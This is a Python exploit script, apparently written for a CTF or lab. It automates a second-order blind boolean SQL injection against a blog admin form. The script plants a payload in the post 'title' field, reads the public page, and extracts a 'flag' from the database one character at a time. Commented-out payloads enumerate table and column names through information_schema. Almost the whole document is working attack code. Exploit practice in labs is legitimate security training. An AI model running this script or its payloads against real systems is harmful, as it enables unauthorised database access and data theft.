#!/usr/bin/env python3

# This script exploits a second order sql (blind boolean) injection.  

import requests
import string

def sqli():
    target= "142.16.1.17"
    proxies= {"http":"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"}
    headers={"Content-Type": "multipart/form-data;boundary=---------------------------29609271438811050402597506081"}
    cookies= {"TEST_ADMIN":"ab203bf128a1eb9bz648dd569c3cf8a7", "columns%2Fblog%2Ftestadmin%2Fblogs_view.php":"{%22blogs-title%22:true%2C%22blogs-category%22:true%2C%22blogs-tags%22:true%2C%22blogs-content%22:true%2C%22blogs-photo%22:true%2C%22blogs-date%22:true%2C%22blogs-author%22:true%2C%22blogs-posted%22:true}"
            }
    secret=""
    count=0
        
    for num in range(1,40):
        if count > 101:
            break
        for char in string.printable:
            #payload=f"'or (SELECT IF(SUBSTRING(table_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.tables WHERE table_schema = 'flag' LIMIT 1)-- -"
            #payload=f"'or (SELECT IF(SUBSTRING(column_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.columns WHERE table_name='flag' AND table_schema = 'flag' LIMIT 1)-- -"
            payload=f"'or (SELECT IF(SUBSTRING(flag,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM flag.flag LIMIT 1)-- -"
            
            data= f'''-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="current_view"

DV
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SortField"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SelectedID"

1
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SelectedField"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SortDirection"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FirstRecord"

1
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="NoDV"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="PrintDV"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[5]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[9]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[13]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[17]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[21]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[25]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[29]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[33]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[37]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[41]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[45]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[49]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[53]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[57]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[61]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[65]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[69]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[73]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[77]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="DisplayRecords"

all
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="title"

{payload}
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="category"

5
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="tags"

blog,php,bootstrap
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="content"

test
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="MAX_FILE_SIZE"

5120000
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="photo"; filename=""
Content-Type: application/octet-stream


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="posted"

draft
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="update_x"

1
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SearchString"


-----------------------------29609271438811050402597506081--'''

            response= requests.post(url=f"http://{target}/blog/blogadmin/blogs_view.php", allow_redirects=True, verify=False, proxies=proxies, cookies=cookies, headers=headers, data=data)

            response= requests.get(url=f"http://{target}/blog/single.php?id=1", proxies=proxies, cookies=cookies, allow_redirects=True)

            if len(response.text) > 1000:
                secret += char
                print(secret)
                count= 0
                break
            else:
                count +=1
                pass
    
try:
    sqli()
except KeyboardInterrupt:
    print("ctrl + c detected, exiting gracefully")
